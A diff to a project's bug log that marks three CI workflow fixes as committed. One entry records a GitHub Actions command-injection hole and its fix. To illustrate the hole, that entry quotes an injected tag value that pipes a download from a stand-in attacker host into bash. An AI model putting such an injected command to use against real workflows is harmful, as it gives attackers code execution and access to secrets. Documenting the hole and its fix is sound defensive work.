@@ -2470,7 +2470,7 @@ Schema per entry:
 - **User-visible symptom:** An attacker with workflow_dispatch permissions could set `tag` input to a value containing shell metacharacters (e.g., `"; curl attacker.com/pwn | bash #`), achieving arbitrary command execution on the GitHub Actions runner. This could exfiltrate secrets, tamper with release artifacts, or compromise the repository.
 - **Root cause:** `${{ inputs.tag }}` was interpolated directly into a `run:` block, not via an environment variable. GitHub Actions doesn't escape `${{ }}` expressions in shell contexts.
 - **Fix:** Changed to pass `inputs.tag` via `env: INPUT_TAG:` and reference as `${INPUT_TAG}` in shell, which the shell quotes safely.
-- **Status:** FIXED:<pending-S19>
+- **Status:** FIXED:a80c2cf
 - **Related:** —
 - **Found in:** S-19
 - **Discovered:** 2026-05-09
@@ -2484,7 +2484,7 @@ Schema per entry:
 - **User-visible symptom:** `self-heal.yml` references `"CI"` and `"Server CI"` in its workflow list. Since `server-ci.yml` was also named `"CI"`, the self-heal workflow couldn't distinguish between server and desktop failures. Server CI failures might not trigger the auto-issue creation, or desktop failures might wrongly be attributed to server.
 - **Root cause:** Copy-paste: `server-ci.yml` wasn't renamed from the template `name: CI`.
 - **Fix:** Renamed `server-ci.yml` workflow to `Server CI` to match `self-heal.yml`'s reference.
-- **Status:** FIXED:<pending-S19>
+- **Status:** FIXED:a80c2cf
 - **Related:** —
 - **Found in:** S-19
 - **Discovered:** 2026-05-09
@@ -2498,7 +2498,7 @@ Schema per entry:
 - **User-visible symptom:** The "Build Linux" step at line 93 re-runs `sudo apt-get update && install` with the exact same packages already installed by "Install Linux deps" at line 34. This wastes ~30 seconds per CI run and creates a maintenance hazard if the package lists diverge.
 - **Root cause:** The build step was likely copy-pasted from a standalone script and the dependency install was not removed.
 - **Fix:** Removed the duplicate `apt-get update/install` from the "Build Linux" step.
-- **Status:** FIXED:<pending-S19>
+- **Status:** FIXED:a80c2cf
 - **Related:** —
 - **Found in:** S-19
 - **Discovered:** 2026-05-09
